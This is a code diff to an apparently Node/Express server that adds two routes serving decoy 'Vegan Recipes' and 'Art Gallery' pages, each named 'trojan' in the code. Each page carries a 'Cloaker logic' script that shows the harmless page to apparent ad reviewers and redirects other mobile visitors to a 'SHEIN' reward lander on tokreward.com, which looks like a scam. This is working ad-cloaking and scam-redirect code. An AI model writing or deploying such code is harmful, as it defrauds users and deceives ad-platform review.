@@ -17,6 +17,228 @@ app.use(express.static(path.join(__dirname, 'public')));
 // ALEXI 5.0
 
 // SHEIN BH FLUENT
+app.get('/87611/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/sheinesp.html?slug=876`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Roboto', sans-serif;
+                    background-color: #e8f5e9;
+                    color: #1b5e20;
+                }
+                .wrapper {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #4caf50;
+                    color: white;
+                    text-align: center;
+                    padding: 20px 0;
+                }
+                .recipe-grid {
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+                    gap: 20px;
+                    margin-top: 30px;
+                }
+                .recipe-card {
+                    background-color: white;
+                    border-radius: 10px;
+                    overflow: hidden;
+                    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+                }
+                .recipe-card img {
+                    width: 100%;
+                    height: 200px;
+                    object-fit: cover;
+                }
+                .recipe-info {
+                    padding: 15px;
+                }
+                .recipe-info h3 {
+                    margin-top: 0;
+                }
+                footer {
+                    background-color: #2e7d32;
+                    color: white;
+                    text-align: center;
+                    padding: 10px 0;
+                    margin-top: 30px;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug} Vegan Recipes</h1>
+            </header>
+            <div class="wrapper">
+                <h2>Discover Delicious Plant-Based Meals</h2>
+                <p>Explore our collection of mouthwatering vegan recipes that are good for you and the planet.</p>
+                <div class="recipe-grid">
+                    <div class="recipe-card">
+                        <img src="https://example.com/vegan-burger.jpg" alt="Vegan Burger">
+                        <div class="recipe-info">
+                            <h3>Ultimate Veggie Burger</h3>
+                            <p>A hearty and flavorful plant-based burger that will satisfy any craving.</p>
+                        </div>
+                    </div>
+                    <div class="recipe-card">
+                        <img src="https://example.com/vegan-curry.jpg" alt="Vegan Curry">
+                        <div class="recipe-info">
+                            <h3>Creamy Coconut Curry</h3>
+                            <p>A rich and aromatic curry packed with vegetables and plant-based protein.</p>
+                        </div>
+                    </div>
+                    <div class="recipe-card">
+                        <img src="https://example.com/vegan-dessert.jpg" alt="Vegan Dessert">
+                        <div class="recipe-info">
+                            <h3>Decadent Chocolate Mousse</h3>
+                            <p>A silky smooth chocolate dessert that's entirely dairy-free and delicious.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <footer>
+                <p>&copy; 2024 ${slug} Vegan Recipes | <a href="https://tokreward.com/pp.html">Privacy Policy</a></p>
+            </footer>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 876 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
+app.get('/9402/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/sheinesp.html?slug=940`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Helvetica', sans-serif;
+                    background-color: #f4f4f4;
+                    color: #333;
+                }
+                .container {
+                    max-width: 1000px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #2c3e50;
+                    color: white;
+                    padding: 20px 0;
+                    text-align: center;
+                }
+                .gallery {
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+                    gap: 20px;
+                    margin-top: 30px;
+                }
+                .gallery-item {
+                    background-color: white;
+                    border-radius: 8px;
+                    overflow: hidden;
+                    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+                }
+                .gallery-item img {
+                    width: 100%;
+                    height: 200px;
+                    object-fit: cover;
+                }
+                .gallery-item h3 {
+                    padding: 10px;
+                    margin: 0;
+                    text-align: center;
+                }
+                footer {
+                    background-color: #34495e;
+                    color: white;
+                    text-align: center;
+                    padding: 10px 0;
+                    margin-top: 30px;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug} Art Gallery</h1>
+            </header>
+            <div class="container">
+                <h2>Welcome to the ${slug} Virtual Exhibition</h2>
+                <p>Explore our curated collection of contemporary artworks from around the world.</p>
+                <div class="gallery">
+                    <div class="gallery-item">
+                        <img src="https://example.com/artwork1.jpg" alt="Abstract Painting">
+                        <h3>Vibrant Chaos</h3>
+                    </div>
+                    <div class="gallery-item">
+                        <img src="https://example.com/artwork2.jpg" alt="Sculpture">
+                        <h3>Bronze Dreams</h3>
+                    </div>
+                    <div class="gallery-item">
+                        <img src="https://example.com/artwork3.jpg" alt="Digital Art">
+                        <h3>Pixelated Reality</h3>
+                    </div>
+                    <div class="gallery-item">
+                        <img src="https://example.com/artwork4.jpg" alt="Photography">
+                        <h3>Urban Solitude</h3>
+                    </div>
+                </div>
+            </div>
+            <footer>
+                <p>&copy; 2024 ${slug} Art Gallery | <a href="https://tokreward.com/pp.html">Privacy Policy</a></p>
+            </footer>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 940 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
 app.get('/87610/:slug', (req, res, next) => {
     const { slug } = req.params;
     const destinationLander = `https://tokreward.com/sheinesp.html?slug=876`;
